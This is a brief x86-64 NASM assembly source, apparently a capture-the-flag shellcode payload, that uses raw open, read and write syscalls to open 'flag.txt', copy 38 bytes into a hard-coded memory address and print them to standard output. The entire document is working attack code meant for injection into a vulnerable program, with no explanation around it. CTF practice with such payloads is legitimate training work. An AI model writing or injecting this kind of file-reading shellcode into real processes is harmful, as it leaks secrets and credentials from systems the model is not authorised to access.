[bits 64]

; nasm chall.asm -o chall.raw

; sys_open
lea rdi, [rel file]
mov rsi, 0o2000
mov al, 2
syscall

; sys_read
movsx rdi, al
mov rsi, 0x4040A0+0x200
mov rdx, 38
mov al, 0
syscall

; sys_write
mov al, 1
mov rdi, 1
syscall

file:		db	"flag.txt", 0x0
